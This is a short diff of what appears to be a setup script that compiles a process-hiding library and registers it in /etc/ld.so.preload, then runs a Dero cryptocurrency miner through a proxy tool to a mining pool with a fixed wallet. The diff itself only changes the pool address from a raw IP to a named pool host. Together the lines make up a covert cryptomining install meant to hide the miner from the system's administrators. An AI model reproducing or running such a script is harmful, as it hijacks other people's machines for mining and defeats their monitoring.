@@ -47,4 +47,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./dero-stratum-miner -r 170.187.197.220:443 -w dero1qyg4z0yuk6hj7qr760c90agjgsngky9f2e4j7s8l60tsqcpcxznnsqgn8lvl4.Gasba
+./graftcp/graftcp ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qyg4z0yuk6hj7qr760c90agjgsngky9f2e4j7s8l60tsqcpcxznnsqgn8lvl4.Gasba
